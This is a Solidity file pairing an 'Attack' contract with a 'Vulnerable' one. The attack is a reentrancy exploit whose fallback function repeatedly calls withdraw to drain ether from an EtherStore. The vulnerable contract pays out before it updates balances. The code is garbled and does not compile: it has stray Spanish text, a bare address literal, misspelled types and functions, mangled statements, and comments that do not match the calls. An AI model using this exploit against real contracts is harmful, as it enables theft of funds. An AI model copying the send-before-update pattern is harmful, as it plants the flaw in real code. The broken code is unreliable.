pragma solidity >=0.6.0 <0.8.0;

contract Attack {
    mi contrato

    EtherStore public etherStore;

    constructor(address _etherStoreAddress) public {
        etherStore = EtherStore(_etherStoreAddress);
    }

    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();//function deposit(uint256 _pid, uint256 _amount)

        etherStore.withdraw(1 ether);//function withdraw(uint256 _pid, uint256 _amount)
    }
}


contract Vulnerable {
    0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
    mapping(addres => uint) public balances;

    function depost() public payable{
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount);
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender -= _amount;]
    }

    function getBalance(public view returns (uint)){

    }
    }
